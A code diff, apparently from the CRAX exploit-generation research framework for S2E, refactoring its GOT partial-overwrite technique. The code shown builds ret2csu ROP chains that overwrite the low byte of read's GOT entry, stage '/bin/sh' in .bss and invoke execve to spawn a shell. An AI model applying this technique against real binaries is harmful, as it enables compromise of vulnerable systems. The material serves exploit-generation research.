@@ -31,24 +31,15 @@ namespace s2e::plugins::crax {
 
 using RopSubchain = Technique::RopSubchain;
 
-GotPartialOverwrite::GotPartialOverwrite(CRAX &ctx)
-    : Technique(ctx) {
+GotPartialOverwrite::GotPartialOverwrite()
+    : Technique() {
     resolveRequiredGadgets();
 }
 
 
-void GotPartialOverwrite::initialize() {
-
-}
-
 bool GotPartialOverwrite::checkRequirements() const {
     return true;
 }
-
-void GotPartialOverwrite::resolveRequiredGadgets() {
-
-}
-
 
 std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
     Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
@@ -56,29 +47,29 @@ std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
     RopSubchain read1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "got", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "got", "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
     RopSubchain read2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
     RopSubchain read3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "bss"),
         ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
     RopSubchain read4 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "bss"),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
@@ -105,15 +96,15 @@ RopSubchain GotPartialOverwrite::getExtraRopSubchain() const {
 
 uint8_t GotPartialOverwrite::getLsbOfReadSyscall() const {
     // Get __read() info from libc.
-    auto f = m_ctx.getExploit().getLibc().functions()["__read"];
+    auto f = g_crax->getExploit().getLibc().functions()["__read"];
 
     std::vector<uint8_t> code(f.size);
-    std::ifstream ifs(m_ctx.getExploit().getLibcFilename(), std::ios::binary);
+    std::ifstream ifs(g_crax->getExploit().getLibcFilename(), std::ios::binary);
     ifs.seekg(f.address, std::ios::beg);
     ifs.read(reinterpret_cast<char*>(code.data()), f.size);
 
     uint64_t syscallOffset = -1;
-    for (auto i : m_ctx.getDisassembler().disasm(code, f.address)) {
+    for (auto i : disas().disasm(code, f.address)) {
         if (i.mnemonic == "syscall") {
             syscallOffset = i.address;
             assert((syscallOffset & 0xff00) == (f.address & 0xff00));
